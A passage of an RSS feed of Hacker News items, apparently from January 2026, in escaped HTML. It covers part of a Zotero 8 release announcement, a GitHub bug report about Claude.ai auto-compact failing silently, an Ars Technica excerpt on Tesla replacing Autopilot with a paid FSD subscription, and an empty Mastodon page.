    &lt;p&gt;You can now press Ctrl/Cmd-; to bring up the menu at any time.&lt;/p&gt;
    &lt;p&gt;Once the menu is open, it simultaneously accepts search input, up/down navigation, and row selection, without the need to move between different parts of the menu. You can simply start typing the name of an open tab and then press Enter/Return to switch to it once you’ve narrowed down the list.&lt;/p&gt;
    &lt;p&gt;It’s also possible to quickly close multiple tabs by moving between the row close buttons with up/down and pressing space bar to close a tab.&lt;/p&gt;
    &lt;head rend="h2"&gt;Continuous File Renaming&lt;/head&gt;
    &lt;p&gt;Zotero now automatically keeps attachment filenames in sync with parent item metadata as you make changes (e.g., changing the title). In previous versions, while Zotero would automatically rename files when you first added them to your library, if you later edited the item’s metadata, you would need to right-click on the attachment and select “Rename File from Parent Metadata”.&lt;/p&gt;
    &lt;p&gt;You can configure which file types renaming applies to from the General tab of the Zotero settings.&lt;/p&gt;
    &lt;p&gt;After upgrading to this version, existing eligible files that don’t match the current filename format won’t be automatically renamed, but you can choose to rename them en masse from the Zotero settings. Zotero will also prompt you to rename all files if you change the filename format.&lt;/p&gt;
    &lt;p&gt;“Rename File from Parent Metadata” has been removed from the item context menu. If a filename doesn’t match the configured filename format (e.g., because automatic renaming is disabled or you changed the format but didn’t choose to rename all files), you can click the “Rename File to Match Parent Item” button next to the filename in the attachment’s item pane to rename it.&lt;/p&gt;
    &lt;head rend="h2"&gt;New Attachment Title Options&lt;/head&gt;
    &lt;p&gt;Zotero 7 introduced more consistent handling of attachment titles, preserving simpler, less-redundant titles (e.g., “Full Text PDF” or “Preprint PDF”) in cases where the title was previously changed to match the filename. Zotero 8 further refines its renaming and titling logic when adding multiple and/or non-primary attachments, to bring the functionality better in line with the intended behavior.&lt;/p&gt;
    &lt;p&gt;We’ve also added a “Normalize Attachment Titles” option under Tools → Manage Attachments to update old primary attachments with titles matching the filename to use simpler titles such as “PDF”.&lt;/p&gt;
    &lt;p&gt;While we recommend the default behavior, allowing Zotero to rename primary files and keep them renamed while using simpler titles in the items list, if you really prefer to view filenames instead of titles, you can now enable “Show attachment filenames in the items list” option in the General pane of the settings.&lt;/p&gt;
    &lt;head rend="h2"&gt;ARM Linux Support&lt;/head&gt;
    &lt;p&gt;Zotero 8 adds a version for Linux running on ARM64 devices. This includes ARM-based Chromebooks, Apple Silicon Macs running Linux (Linux VMs, Asahi Linux), and Raspberry Pis.&lt;/p&gt;
    &lt;p&gt;If you’ve been unable to run Zotero on your ARM-based device, or you’ve been running the x86_64 version under emulation, give it a try.&lt;/p&gt;
    &lt;head rend="h2"&gt;User Interface Improvements&lt;/head&gt;
    &lt;p&gt;We’ve made a number of changes across the interface to address common requests:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A new button in the library tab allows you to quickly close the item pane without dragging its edge or using the menus.&lt;/item&gt;
      &lt;item&gt;You can reorder item pane sections by dragging their icons in the side navigation bar.&lt;/item&gt;
      &lt;item&gt;You can drag items, collections, and searches into the trash.&lt;/item&gt;
      &lt;item&gt;You can drag attachments, notes, and related items from the item pane (e.g., to copy files to the filesystem or use Quick Copy).&lt;/item&gt;
      &lt;item&gt;Collections automatically expand when you drag over them, making it easier to drop collections or items into subcollections.&lt;/item&gt;
      &lt;item&gt;You can delete attachments from the item pane.&lt;/item&gt;
      &lt;item&gt;Tabs maintain their size as you close them for faster closing of multiple tabs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Tag Autocomplete and Note Field in Zotero Connector&lt;/head&gt;
    &lt;p&gt;With Zotero 8, the Zotero Connector save popup can autocomplete tags in your Zotero library and allows you to add a note to items as you save them.&lt;/p&gt;
    &lt;head rend="h2"&gt;And Much More&lt;/head&gt;
    &lt;p&gt;Zotero 8 includes much more than we can list here. See the changelog for additional details.&lt;/p&gt;
    &lt;head rend="h2"&gt;System Requirements&lt;/head&gt;
    &lt;p&gt;Zotero 8 requires macOS 10.15 or later, Windows 10 or later, or a Firefox 140–compatible Linux system.&lt;/p&gt;
    &lt;head rend="h2"&gt;Faster Future Releases&lt;/head&gt;
    &lt;p&gt;Going forward, we’re changing how we put out Zotero releases. Read about Zotero’s new release schedule.&lt;/p&gt;
    &lt;head rend="h2"&gt;Get Zotero 8&lt;/head&gt;
    &lt;p&gt;If you’re already running Zotero, you can upgrade from within Zotero by going to Help → “Check for Updates…”.&lt;/p&gt;
    &lt;p&gt;Don’t yet have Zotero? Download Zotero 8 now.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735616</guid><pubDate>Fri, 23 Jan 2026 18:05:08 +0000</pubDate></item><item><title>Claude.ai silently failing since Jan 14, no official acknowledgment</title><link>https://github.com/anthropics/claude-code/issues/18866</link><description>&lt;doc fingerprint="5e1de69612ab8ad6"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Notifications &lt;tool-tip&gt;You must be signed in to change notification settings&lt;/tool-tip&gt;&lt;/item&gt;
      &lt;item&gt;Fork 4.5k&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Description&lt;/head&gt;
    &lt;head rend="h3"&gt;Preflight Checklist&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I have searched existing issues and this hasn't been reported yet&lt;/item&gt;
      &lt;item&gt;This is a single bug report (please file separate reports for different bugs)&lt;/item&gt;
      &lt;item&gt;I am using the latest version of Claude Code&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;What's Wrong?&lt;/head&gt;
    &lt;p&gt;Auto-compact doesn't work. Anthropic flagged this as fixed on January 15, but the issue persists. When context window fills up, instead of auto-compacting and continuing the conversation, one of two things happens:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Messages get bounced back to the input box with no error (most common).&lt;/item&gt;
      &lt;item&gt;Occasionally, a "limit reached" error appears.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This happens even when the context being fed the chat shouldn't be anywhere near the 200k token limit.&lt;/p&gt;
    &lt;head rend="h3"&gt;What Should Happen?&lt;/head&gt;
    &lt;p&gt;Auto-compact should trigger automatically when approaching context limits, allowing the conversation to continue without manual intervention.&lt;/p&gt;
    &lt;head rend="h3"&gt;Error Messages/Logs&lt;/head&gt;
    &lt;code&gt;Usually none; message just silently returns to input box.
Occasionally "limit reached" error.&lt;/code&gt;
    &lt;head rend="h3"&gt;Steps to Reproduce&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Create a new chat within a Claude.ai project (mine is ~3% capacity).&lt;/item&gt;
      &lt;item&gt;Feed it a substantial amount of context (documents, instructions, etc.).&lt;/item&gt;
      &lt;item&gt;Continue chatting until context builds up.&lt;/item&gt;
      &lt;item&gt;Attempt to send another message.&lt;/item&gt;
      &lt;item&gt;Message gets returned to input box OR "limit reached" error appears.&lt;/item&gt;
      &lt;item&gt;Auto-compact never triggers.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Claude Model&lt;/head&gt;
    &lt;p&gt;Not sure / Multiple models&lt;/p&gt;
    &lt;head rend="h3"&gt;Is this a regression?&lt;/head&gt;
    &lt;p&gt;Yes, this worked in a previous version&lt;/p&gt;
    &lt;head rend="h3"&gt;Last Working Version&lt;/head&gt;
    &lt;p&gt;Claude.ai (web/desktop) worked prior to January 14 major outage and January 15 compaction incident. Broken since.&lt;/p&gt;
    &lt;head rend="h3"&gt;Claude Code Version&lt;/head&gt;
    &lt;p&gt;N/A&lt;/p&gt;
    &lt;head rend="h3"&gt;Platform&lt;/head&gt;
    &lt;p&gt;Other&lt;/p&gt;
    &lt;head rend="h3"&gt;Operating System&lt;/head&gt;
    &lt;p&gt;Windows&lt;/p&gt;
    &lt;head rend="h3"&gt;Terminal/Shell&lt;/head&gt;
    &lt;p&gt;Other&lt;/p&gt;
    &lt;head rend="h3"&gt;Additional Information&lt;/head&gt;
    &lt;p&gt;Issue was reported previously and marked as resolved January 15. Still broken as of January 17.&lt;lb/&gt; Happens within Projects, unsure if it affects non-Project chats.&lt;/p&gt;
    &lt;p&gt;Note: Submitting here because there's no dedicated bug tracker for Claude.ai. This affects the web and desktop interfaces, not Claude Code specifically. Auto-compact was functional before the January 14 outage and has remained broken despite being flagged as fixed on January 15.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46736091</guid><pubDate>Fri, 23 Jan 2026 18:42:38 +0000</pubDate></item><item><title>Tesla kills Autopilot, locks lane-keeping behind $99/month fee</title><link>https://arstechnica.com/cars/2026/01/tesla-wants-recurring-revenue-discontinues-autopilot-in-favor-of-fsd/</link><description>&lt;doc fingerprint="acbc0e1c3997d38a"&gt;
  &lt;main&gt;
    &lt;p&gt;Love it or hate it, Tesla has been responsible for helping to shape the tastes of automotive consumers over the past decade-plus. Over-the-air updates that add more features, an all-touchscreen human-machine interface, large castings, and hands-free driver assists were all introduced or popularized by Tesla’s electric vehicles, prompting other automakers to copy them, mostly in the hopes of seeing the same stratospheric gains in their stock prices. But starting on Valentine’s Day, if you want your Tesla to steer itself, you’ll have to pay a $99 monthly subscription fee.&lt;/p&gt;
    &lt;p&gt;Tesla currently offers a pair of so-called “level 2” partially automated driver assist systems. Autopilot is the older of these, combining Tesla’s adaptive cruise control (Tesla calls this TACC) and lane-keeping assist (Tesla calls this Autosteer). FSD is the newer system, meant to be more capable and for use on surface streets and divided-lane highways. Although the company and Tesla CEO Elon Musk regularly tout these systems’ capabilities, both still require the human driver to provide situational awareness.&lt;/p&gt;
    &lt;p&gt;But Autopilot has been under fire from regulators and the courts. Multiple wrongful death lawsuits are in the works, and after a high-profile loss resulting in a $329 million judgment against Tesla, expect many of these suits to be settled. Both the federal government and California have investigated whether Tesla misled customers, and in December, an administrative law judge ruled that Tesla indeed engaged in deceptive marketing by implying that its cars could drive themselves. The judge suspended Tesla’s license to sell cars in California, a decision that the California Department of Motor Vehicles stayed for 60 days.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46736683</guid><pubDate>Fri, 23 Jan 2026 19:28:10 +0000</pubDate></item><item><title>Iran Govt Fakes Traffic to Mimic Internet Restoration</title><link>https://mastodon.social/@netblocks/115942585753525035</link><description>&lt;doc fingerprint="f8eb8f2f2d953eed"&gt;
  &lt;main&gt;
    &lt;p&gt;To use the Mastodon web application, please enable JavaScript. Alternatively, try one of the native apps for Mastodon for your platform.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46736734</guid><pubDate>Fri, 23 Jan 2026 19:31:44 +0000</pubDate></item></channel></rss>